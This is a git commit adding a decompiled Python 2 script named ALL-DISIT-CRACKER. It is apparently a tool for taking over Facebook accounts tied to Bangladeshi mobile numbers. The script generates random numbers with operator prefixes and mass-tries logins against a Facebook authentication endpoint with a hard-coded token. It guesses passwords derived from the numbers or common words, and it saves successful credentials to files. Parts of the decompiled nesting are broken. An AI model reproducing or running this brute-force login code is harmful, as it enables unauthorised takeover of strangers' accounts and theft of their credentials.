af8da72ac85d4d754a533a2f9903ee6585a8eda3
Dēmøñ <91779473+D3M09@users.noreply.github.com>
2021-10-20 01:46:14 +0600

    Add files via upload

---
+++ Abir-Hossain/ALL-DISIT-CRACKER_dec.py
@@ -0,0 +1,380 @@
+# uncompyle6 version 3.6.7
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: dg
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(20000):
+    nmbr = random.randint(11111111, 99999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+os.system('clear')
+os.system('lolcat calar.py')
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+print
+count = 0
+while count < 9999999:
+    username = raw_input('\x1b[1;95mEnter username:\x1b[1;96m  ')
+    print
+    password = raw_input('\x1b[1;95mEnter password:\x1b[1;96m  ')
+    if password == '' and username == '':
+        print 'Access granted'
+        os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
+        break
+    else:
+        print '\x1b[1;94m Access denied. Try again.'
+        count += 1
+        print '\t\t\t\x1b[1;91mFor User & Password Contact With Owner'
+        os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
+
+def menu():
+    os.system('clear')
+    os.system('lolcat calar.py')
+    print
+    print '\x1b[1;94m______________________________________'
+    print
+    print '\x1b[1;91mBANGLADESH ALL OPERETOR NETWORK'
+    print
+    print '\x1b[1;92m[1]  ROBI'
+    print '\x1b[1;92m[2]  AIRTEL'
+    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
+    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
+    print '\x1b[1;92m[5]  GRAMEEN'
+    print '\x1b[1;92m[6]  TELETALK'
+    print '\x1b[1;92m[7]  CONTACT ME'
+    print '\x1b[1;92m[0]  EXIT'
+    print '\x1b[1;94m______________________________________'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\x1b[1;96mENTER ANY NUMBER ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            k = '+880'
+            c = '18'
+            pq = '8'
+            l = '0'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            c = '16'
+            l = '0'
+            pq = '6'
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            c = '19'
+            l = '0'
+            pq = '9'
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '4':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            c = '14'
+            l = '0'
+            pq = '4'
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '5':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            c = '17'
+            l = '0'
+            pq = '7'
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '6':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        try:
+            c = '15'
+            l = '0'
+            pq = '5'
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '033[1:91m[!] File Not Found'
+            raw_input('[ Back ]')
+            menu()
+
+    elif bch == '7':
+        os.system('clear')
+        os.system('lolcat calar.py')
+        time.sleep(2)
+        os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
+        exit()
+    elif bch == '0':
+        exb()
+    else:
+        print '[!] Fill in correctly'
+        action()
+    xxx = str(len(id))
+    print
+    psb('\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;96mTotal Numbers: ' + xxx)
+    time.sleep(0.5)
+    psb('\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;92mPlease wait, process is running ...')
+    time.sleep(0.5)
+    psb('\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;95mAbir Hossain 06/07/08/09/10/11Digit Cracking tool ...')
+    time.sleep(0.5)
+    psb('\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;91mFor stop this process press ctrl+z ')
+    time.sleep(0.5)
+    print 50 * '-'
+    print
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user[2:]
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pass1
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pass1
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = user[1:]
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pass2
+                    okb = open('save/successfull.txt', 'a')
+                    okb.write(k + c + user + '|' + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pass2
+                    cps = open('save/checkpoint.txt', 'a')
+                    cps.write(k + c + user + '|' + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
+                else:
+                    pass3 = user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pass3
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pass3
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+                    else:
+                        pass4 = user
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pq + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pq + pass4
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + pq + pass4 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass4)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pq + pass4
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + pq + pass4 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass4)
+                    else:
+                        pass5 = user[:7]
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + l + c + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + l + c + pass5
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + l + c + pass5 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass5)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + l + c + pass5
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + l + c + pass5 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass5)
+                    else:
+                        pass6 = user
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + l + c + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + l + c + pass6
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + l + c + pass6 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass6)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + l + c + pass6
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + l + c + pass6 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass6)
+                    else:
+                        pass7 = '786786'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pass7
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + pass7 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass7)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pass7
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + pass7 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass7)
+                    else:
+                        pass8 = 'Bangladesh'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(Successfull) \x1b[1;95m\x1b[1;93m\x1b[1;96m' + k + c + user + '\x1b[1;93m\x1b[1;95m <=> ' + pass8
+                        okb = open('save/successfull.txt', 'a')
+                        okb.write(k + c + user + '|' + pass8 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass8)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;96m[chekpoint] \x1b[1;95m\x1b[1;93m\x1b[1;94m' + k + c + user + '\x1b[1;93m\x1b[1;93m <=> ' + pass8
+                        cps = open('save/checkpoint.txt', 'a')
+                        cps.write(k + c + user + '|' + pass8 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass8)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '-'
+    print '\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;92mProcess Has Been Completed ....'
+    print '\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;92mTotal OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '\x1b[1;93m[\x1b[1;91m\xe2\x88\x9a\x1b[1;93m] \x1b[1;96mCP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\x1b[1;93mPress Enter To Go Back]')
+    os.system('python2 Cloning.py')
+
+
+if __name__ == '__main__':
+    menu()
